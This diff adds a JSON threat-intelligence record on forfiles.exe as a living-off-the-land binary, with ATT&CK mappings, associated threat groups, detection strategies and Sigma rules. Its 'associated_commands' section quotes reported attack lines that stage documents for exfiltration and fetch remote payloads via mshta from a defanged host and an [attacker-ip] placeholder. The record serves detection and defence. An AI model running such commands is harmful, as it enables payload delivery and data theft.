@@ -1,0 +1,615 @@
+{
+  "type": "lolbin-details",
+  "version": 2,
+  "id": "126cd277-f624-4451-ae12-6773e01e8385",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2026-10-17T20:13:00.000Z",
+  "modified": "2026-10-17T20:13:00.000Z",
+  "name": "Forfiles.exe",
+  "image": "forfiles.exe",
+  "description": "Forfiles is a Windows utility commonly used in batch jobs to execute commands on one or more selected files or directories (ex: list all directories in a drive, read the first line of all files created yesterday, etc.). Forfiles can be executed from either the command line, Run window, or batch files/scripts.",
+  "attack": {
+    "id": "S0193",
+    "name": "Forfiles",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0193",
+    "version": "20.0"
+  },
+  "summary": [
+    "Indirect command execution without invoking cmd",
+    "Execute commands to bypass restrictions on command-line interpreters"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "C:\\Windows\\System32\\forfiles.exe",
+    "C:\\Windows\\SysWOW64\\forfiles.exe"
+  ],
+  "hashes": {
+    "MD5": "9BB67AEA5E26CB136F23F29CC48D6B9E"
+  },
+  "capabilities": [
+    "Execute",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0007:Discovery:T1083",
+    "TA0009:Collection:T1005",
+    "TA0005:Stealth:T1202"
+  ],
+  "techniques": [
+    {
+      "id": "T1083",
+      "name": "File and Directory Discovery",
+      "url": "https://attack.mitre.org/techniques/T1083",
+      "tactics": [
+        "Discovery"
+      ]
+    },
+    {
+      "id": "T1005",
+      "name": "Data from Local System",
+      "url": "https://attack.mitre.org/techniques/T1005",
+      "tactics": [
+        "Collection"
+      ]
+    },
+    {
+      "id": "T1202",
+      "name": "Indirect Command Execution",
+      "url": "https://attack.mitre.org/techniques/T1202",
+      "tactics": [
+        "Stealth"
+      ]
+    }
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT28",
+        "attack_id": "G0007",
+        "evidence": [
+          "uses S0193",
+          "names forfiles.exe"
+        ]
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": [
+          "names forfiles.exe"
+        ]
+      }
+    ],
+    "associated_campaigns": [],
+    "associated_malware": [
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": [
+          "names forfiles.exe"
+        ]
+      }
+    ],
+    "associated_tools": [],
+    "technique_only": [],
+    "attack_relationships": [
+      {
+        "source": "APT28",
+        "type": "intrusion-set",
+        "attack_id": "G0007",
+        "description": "",
+        "citations": [
+          {
+            "source_name": "Überwachung APT28 Forfiles June 2015",
+            "url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
+          }
+        ]
+      },
+      {
+        "source": "APT28",
+        "type": "intrusion-set",
+        "attack_id": "G0007",
+        "description": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.",
+        "citations": [
+          {
+            "source_name": "Überwachung APT28 Forfiles June 2015",
+            "url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
+          },
+          {
+            "source_name": "DOJ GRU Indictment Jul 2018",
+            "url": "https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf"
+          }
+        ]
+      },
+      {
+        "source": "APT28",
+        "type": "intrusion-set",
+        "attack_id": "G0007",
+        "description": "APT28 has retrieved internal documents from machines inside victim environments, including by using Forfiles to stage documents before exfiltration.",
+        "citations": [
+          {
+            "source_name": "Überwachung APT28 Forfiles June 2015",
+            "url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
+          },
+          {
+            "source_name": "TrendMicro Pawn Storm 2019",
+            "url": "https://documents.trendmicro.com/assets/white_papers/wp-pawn-storm-in-2019.pdf"
+          },
+          {
+            "source_name": "DOJ GRU Indictment Jul 2018",
+            "url": "https://cdn.cnn.com/cnn/2018/images/07/13/gru.indictment.pdf"
+          },
+          {
+            "source_name": "Cybersecurity Advisory GRU Brute Force Campaign July 2021",
+            "url": "https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/1/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF"
+          }
+        ]
+      },
+      {
+        "source": "Lazarus Group",
+        "type": "intrusion-set",
+        "attack_id": "G0032",
+        "description": "Lazarus Group persistence mechanisms have used forfiles.exe to execute.htm files.",
+        "citations": [
+          {
+            "source_name": "Qualys LolZarus",
+            "url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns"
+          }
+        ]
+      },
+      {
+        "source": "Revenge RAT",
+        "type": "malware",
+        "attack_id": "S0379",
+        "description": "Revenge RAT uses the Forfiles utility to execute commands on the system.",
+        "citations": [
+          {
+            "source_name": "Cofense RevengeRAT Feb 2019",
+            "url": "https://web.archive.org/web/20200428173819/https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/"
+          }
+        ]
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "forfiles /P F:[REDACTED] /m *%%G /s /d +01.05.2015 /c \"cmd /c copy @path C:ProgramData[REDACTED]d@file\"",
+        "intent": "The report says the script identifies all PDF and Office documents dated after May 1st and collects them in a folder, supposedly ready to be exfiltrated.",
+        "status": "verified",
+        "source_name": "Guarnieri Bundestag Left Party Hack (netzpolitik.org) June 2015",
+        "source_url": "https://netzpolitik.org/2015/digital-attack-on-german-parliament-investigative-report-on-the-hack-of-the-left-party-infrastructure-in-bundestag/"
+      },
+      {
+        "command": "forfiles.exe /p C:\\Windows /m win.ini /c \"powershell . mshta https://nextomax.b-cdn[.]net/nexto\"",
+        "intent": "Mandiant says the LNK file uses forfiles.exe to search C:\\Windows for win.ini and, for each match, start powershell to retrieve a second-stage payload and execute it with mshta.exe.",
+        "status": "verified",
+        "source_name": "Mandiant PEAKLIGHT August 2024",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/peaklight-decoding-stealthy-memory-only-malware"
+      },
+      {
+        "command": "C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"cmd /c start mshta http ://[attacker-ip]/web\"",
+        "intent": "Malwarebytes says the attacker used forfiles.exe to launch mshta so one trusted program starts another and the execution path is harder for security tools to spot.",
+        "status": "verified",
+        "source_name": "Malwarebytes LOLBins Remcos NetSupport January 2026",
+        "source_url": "https://www.malwarebytes.com/blog/news/2026/01/can-you-use-too-many-lolbins-to-drop-some-rats"
+      }
+    ]
+  },
+  "detections": {
+    "event_ids": {
+      "WinEventLog:Security": [
+        {
+          "event_id": 4688,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1083",
+            "T1005"
+          ]
+        }
+      ],
+      "WinEventLog:Sysmon": [
+        {
+          "event_id": 1,
+          "data_components": [
+            "Process Creation"
+          ],
+          "techniques": [
+            "T1202"
+          ]
+        },
+        {
+          "event_id": 3,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1202"
+          ]
+        },
+        {
+          "event_id": 11,
+          "data_components": [
+            "File Creation"
+          ],
+          "techniques": [
+            "T1083",
+            "T1005",
+            "T1202"
+          ]
+        },
+        {
+          "event_id": 22,
+          "data_components": [
+            "Network Connection Creation"
+          ],
+          "techniques": [
+            "T1202"
+          ]
+        }
+      ]
+    },
+    "other_log_sources": [],
+    "attack_detection_strategies": [
+      {
+        "technique": "T1083",
+        "id": "DET0370",
+        "name": "Recursive Enumeration of Files and Directories Across Privilege Contexts",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0370",
+        "analytics": [
+          {
+            "id": "AN1040",
+            "description": "Execution of file enumeration commands (e.g., 'dir', 'tree') from non-standard processes or unusual user contexts, followed by recursive directory traversal or access to sensitive locations.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1005",
+        "id": "DET0380",
+        "name": "Detection of Local Data Collection Prior to Exfiltration",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0380",
+        "analytics": [
+          {
+            "id": "AN1070",
+            "description": "Adversaries collecting local files via PowerShell, WMI, or direct file API calls often include recursive file listings, targeted file reads, and temporary file staging.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Security",
+                "channel": "EventCode=4688"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "technique": "T1202",
+        "id": "DET0200",
+        "name": "Indirect Command Execution – Windows utility abuse behavior chain",
+        "url": "https://attack.mitre.org/detectionstrategies/DET0200",
+        "analytics": [
+          {
+            "id": "AN0576",
+            "description": "Cause→effect chain: (1) A user or service launches an indirection utility (e.g., forfiles.exe, pcalua.exe, wsl.exe, scriptrunner.exe, ssh.exe with -o ProxyCommand/LocalCommand). (2) That utility spawns a secondary program/command (PowerShell, cmd, msiexec, regsvr32, curl, arbitrary EXE) and/or opens outbound network connections. (3) Optional precursor modification of SSH config to persist LocalCommand/ProxyCommand. Correlate process creation, command/script content, file access to %USERPROFILE%\\.ssh\\config, and network connections from the utility or its child.",
+            "log_sources": [
+              {
+                "data_component": "Process Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=1"
+              },
+              {
+                "data_component": "Network Connection Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=3, 22"
+              },
+              {
+                "data_component": "File Creation",
+                "name": "WinEventLog:Sysmon",
+                "channel": "EventCode=11"
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "sigma_rules": [
+      {
+        "title": "Forfiles Command Execution",
+        "id": "9aa5106d-bce3-4b13-86df-3a20f1d5cf0b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_forfiles_proxy_execution_.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "dedicated",
+        "matched_on": [
+          "image",
+          "original_filename"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Potentially Suspicious PowerShell Child Processes",
+        "id": "e4b6d2a7-d8a4-4f19-acbd-943c16d90647",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_susp_child_processes.yml",
+        "level": "medium",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059.001"
+        ]
+      },
+      {
+        "title": "Windows Shell/Scripting Application File Write to Suspicious Folder",
+        "id": "1277f594-a7d1-4f28-a2d3-73af5cbeab43",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "file_event",
+          "product": "windows"
+        },
+        "attack": [
+          "T1059"
+        ]
+      },
+      {
+        "title": "Forfiles.EXE Child Process Masquerading",
+        "id": "f53714ec-5077-420e-ad20-907ff9bb2958",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_forfiles_child_process_masquerading.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "parent_image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1036"
+        ]
+      },
+      {
+        "title": "Suspicious Child Process of Notepad++ Updater - GUP.Exe",
+        "id": "bb0e87ce-c89f-4857-84fa-095e4483e9cb",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_gup_susp_child_process.yml",
+        "level": "high",
+        "status": "experimental",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1195.002",
+          "T1557"
+        ]
+      },
+      {
+        "title": "Suspicious Shells Spawn by Java Utility Keytool",
+        "id": "90fb5e62-ca1f-4e22-b42e-cc521874c938",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_keytool_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Child Process Of Manage Engine ServiceDesk",
+        "id": "cea2b7ea-792b-405f-95a1-b903ea06458f",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_manageengine_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1102"
+        ]
+      },
+      {
+        "title": "Suspicious Processes Spawned by Java.EXE",
+        "id": "0d34ed8b-1c12-4ff2-828c-16fc860b766d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_java_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": []
+      },
+      {
+        "title": "Suspicious Microsoft OneNote Child Process",
+        "id": "c27515df-97a9-4162-8a60-dc0eeb51b775",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_onenote_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1566",
+          "T1566.001"
+        ]
+      },
+      {
+        "title": "Suspicious Outlook Child Process",
+        "id": "208748f7-881d-47ac-a29c-07ea84bf691d",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_outlook_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1204.002"
+        ]
+      },
+      {
+        "title": "Suspicious Microsoft Office Child Process",
+        "id": "438025f9-5856-4663-83f7-52f878a70a50",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_office_susp_child_processes.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1047",
+          "T1204.002",
+          "T1218.010"
+        ]
+      },
+      {
+        "title": "Suspicious Modification Of Scheduled Tasks",
+        "id": "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_schtasks_change.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "command_line"
+        ],
+        "logsource": {
+          "product": "windows",
+          "category": "process_creation"
+        },
+        "attack": [
+          "T1053.005"
+        ]
+      },
+      {
+        "title": "Suspicious Serv-U Process Pattern",
+        "id": "58f4ea09-0fc2-4520-ba18-b85c540b0eaf",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_servu_susp_child_process.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1555"
+        ]
+      },
+      {
+        "title": "Suspicious SYSTEM User Process Creation",
+        "id": "2617e7ed-adb7-40ba-b0f3-8f9945fe6c09",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_susp_system_user_anomaly.yml",
+        "level": "high",
+        "status": "test",
+        "scope": "related",
+        "matched_on": [
+          "image"
+        ],
+        "logsource": {
+          "category": "process_creation",
+          "product": "windows"
+        },
+        "attack": [
+          "T1003",
+          "T1027",
+          "T1134"
+        ]
+      }
+    ],
+    "other_rules": []
+  },
+  "related_CVE": [],
+  "mitigations": [
+    {
+      "id": "M1057",
+      "name": "Data Loss Prevention",
+      "technique": "T1005",
+      "description": "Data loss prevention can restrict access to sensitive data and detect sensitive data that is unencrypted."
+    }
+  ],
+  "additional_mitigations": [],
+  "references": [
+    "https://attack.mitre.org/software/S0193",
+    "https://lolbas-project.github.io/lolbas/Binaries/Forfiles/",
+    "https://strontic.github.io/xcyclopedia/library/forfiles.exe-9BB67AEA5E26CB136F23F29CC48D6B9E.html"
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
+}
